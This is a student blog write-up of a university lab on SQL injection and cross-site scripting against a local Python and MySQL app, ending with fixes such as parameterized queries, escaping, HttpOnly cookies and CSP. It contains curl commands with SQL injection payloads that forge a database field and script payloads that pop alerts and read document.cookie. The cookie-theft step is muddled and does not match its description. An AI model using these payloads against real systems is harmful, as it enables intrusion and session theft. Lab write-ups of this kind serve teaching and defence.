---
title: Cybersecurity2 - Introduction to secure systems - University of Lille
author:
  name: Pierre Lague & François Muller (@franzele21)
  link: 
date: 2024-02-10 09:45:00 +0800
categories: [Studies, U-Lille]
tags: [Python, Security, C]
math: true
mermaid: true
image:
  src: '/assets/posts/security/header.jpg'
  width: 800
  height: 600
---

# Cybersecurity Class🛡️

## Overview
This class is proposed as part of the first year of masters curriculum at the University of Lille and it overlooked by Pr Gilles GRIMAUD. It delves into four primary themes: permissions and secure file systems, SQL injections, XSS attacks and prevention methods, and cryptography with RSA and elliptic curves.

## Themes Explored

### SQL Injections
Exploring SQL injection vulnerabilities and implementing strategies to prevent malicious SQL injections, ensuring robustness of database systems.

### XSS Attacks and Prevention
Investigating cross-site scripting (XSS) attacks and implementing preventive measures to safeguard web applications against such vulnerabilities.
---
## Preface

After testing the application and entering some strings, we can observe them in the `strings` table:

```sql
mysql> SELECT * FROM strings;
+----+---------+-----------+
| id | txt     | who       |
+----+---------+-----------+
|  1 | hello   | 127.0.0.1 |
|  2 | bonjour | 127.0.0.1 |
|  3 | 33XD    | 127.0.0.1 |
+----+---------+-----------+
3 rows in set (0.00 sec)

```

## Question 1

Examining the source code of `server.py`, we have the following observations:
- the SQL query sent by the server after receiving the data is as follows: ```sql query = "INSERT INTO strings (txt, who) VALUES('" + post["string"] + "','" + cherrypy.request.remote.ip + "')" ```.

>* **What is this mechanism?**

We notice that in the source code of the page there is a `validate()` function. Within this function, there is a variable `regex = /^[a-zA-Z0-9]+$/;` acting as a filter on the string we enter in the application.
The `validate()` function checks that the entered string consists only of letters and numbers (so no spaces or other characters). If not, the function returns false.

>* **Is it effective? Why?**

The mechanism seems effective because it is not possible to insert spaces or `'` to inject a SQL expression.

## Question 2

>* **Your curl command**

```bash
curl 'http://localhost:8080/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost:8080' -H 'Connection: keep-alive' -H 'Referer: http://localhost:8080/' -H 'Cookie: ExampleCookie="Cookie Value"' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'string=SELECT * from strings;&submit=OK'
```

When looking at the database after execution, we get the following result:

```sql
mysql> select * from strings;
+----+-----------------------+-----------+
| id | txt                   | who       |
+----+-----------------------+-----------+
|  1 | hello                 | 127.0.0.1 |
|  2 | bonjour               | 127.0.0.1 |
|  3 | 33XD                  | 127.0.0.1 |
|  4 | hello                 | 127.0.0.1 |
|  5 | bonjour               | 127.0.0.1 |
|  6 | 33XD                  | 127.0.0.1 |
|  7 | SELECT * from strings | 127.0.0.1 |
+----+-----------------------+-----------+
7 rows in set (0.00 sec)

```
We were able to insert the string `SELECT * from strings`, which contains spaces and special characters. This shows that the `cURL` method allows us to bypass the security of the `validate` function.

## Question 3

>* **Your curl command that will allow you to add an entry by putting arbitrary content in the 'who' field**

```bash
curl -X POST http://localhost:8080/ -d "string=H4CK3RM4N','IT WAS FRANCOIS WHO DID THIS')#"
```
We can observe the following table:

```sql
mysql> select * from strings;
+----+-----------+--------------------------+
| id | txt       | who                      |
+----+-----------+--------------------------+
| 91 | H4CK3RM4N | IT WAS FRANCOIS WHO DID THIS |
+----+-----------+--------------------------+
1 row in set (0.00 sec)
```

* Explain how to get information on another table

Assuming that our `mysql` database has a `secret` table containing 1 entry. To access it, we would need to execute a query in the SQL injection in such a way that the injection ends and executes directly the other.

## Question 4

> see `server-correct.py`

To fix the security flaw, we can use `MySQL Parameterized Query using Prepared Statement`. This method allows us to execute queries with two prepared and separated fields, forcing any additional string (injection) to be considered as an integer value. Therefore, using the `cURL` command that worked previously, we are no longer able to modify the `who` field in the injection. We get the following database:

```sql
mysql> select * from strings;
+-----+-----------------------------------------+--------------------------+
| id  | txt                                     | who                      |
+-----+-----------------------------------------+--------------------------+
|  91 | H4CK3RM4N                               | IT WAS FRANCOIS WHO DID THIS |
|  92 | yoLeSang                                | 127.0.0.1                |
|  93 | yoLeSang                                | 127.0.0.1                |
|  94 | test                                    | 127.0.0.1                |
|  95 | test                                    | 127.0.0.1                |
|  96 | test                                    | IT'S THE HANDSOME GUY    |
|  97 | test                                    | 127.0.0.1                |
|  98 | test                                    | IT'S THE HANDSOME GUY    |
|  99 | test                                    | 127.0.0.1                |
| 100 | H4CK3RM4N                               | IT WAS FRANCOIS WHO DID THIS |
| 101 | H4CK3RM4N                               | IT WAS FRANCOIS WHO DID THIS |
| 102 | H4CK3RM4N                               | IT WAS FRANCOIS WHO DID THIS |
| 103 | H4CK3RM4N                               | IT WAS FRANCOIS WHO DID THIS |
| 104 | H4CK3RM4N','IT WAS FRANCOIS WHO DID THIS')# | 127.0.0.1                |
+-----+-----------------------------------------+--------------------------+
14 rows in set (0.00 sec)
```
We see that on line 104, our hardcoded injection is inserted into `txt` but the `who` contains our IP address.

## Question 5

>* Vulnerability study on the `server.py` file

We observe lines 

37 to 42 an insertion of data coming from the python code. We could try to empty the table, then insert an entry interpreted as `html` in which we would insert a `<script>` tag. **that's it**.

With the implementation of `Parametrized Queries`, then the `cURL` command below allows to trigger an alert `Hello!` to the user (or a prompt):

```bash
pierre.lague.etu@a04p16:~$ a='"Hello!"'
pierre.lague.etu@a04p16:~$ curl -X POST http://localhost:8080/ -d "string=<script>alert($a)</script>','')#"
```

This is possible because the string is interpreted as an `html` tag in the enumeration of the rows of the table.

>* curl command to read cookies

Similarly, we can extract cookies by creating a listener with `netcat` on a separate terminal. By modifying the `document.location` we can redirect the user to another page (ours `ip:port`):

```bash
curl -X POST http://localhost:8080/ -d "string=<script><script>alert(document.cookie)</script></script>','')#"
```

## Question 6

XSS belongs to the family of "Code Injection" vulnerabilities. Like all vulnerabilities in this family, they are due to a lack of validation of user inputs.

Every user input must be systematically checked and, if necessary, escaped before being inserted into an HTML page. This applies to parameters from forms but also to parameters contained in the potential URLs of the web application. Many libraries can be used to escape user inputs depending on the technology used by the web application.

In addition to this, it may be interesting to implement an application firewall or WAF. The role of such a firewall is to detect attempts to exploit XSS on the web application and block them before the code injection is executed on the victim's browser.

Furthermore, to prevent the exploitation of XSS from stealing users' cookies, it is recommended to set the "HTTPOnly" flag on session cookies. This will prevent access to cookies via JavaScript.

Finally, it is possible to configure the web server of the application to return certain headers for protection against XSS:

- X-XSS-Protection: enables the XSS filter of some recent browsers.

- Content Security Policy or CSP: the CSP defines the sources (images, CSS or JavaScript files) of a web application allowed to be loaded on users' browsers. A well-configured CSP will prevent a potential attacker from loading external JavaScript files through users' browsers.

---

🔒 Secure your systems, shield your data 🔒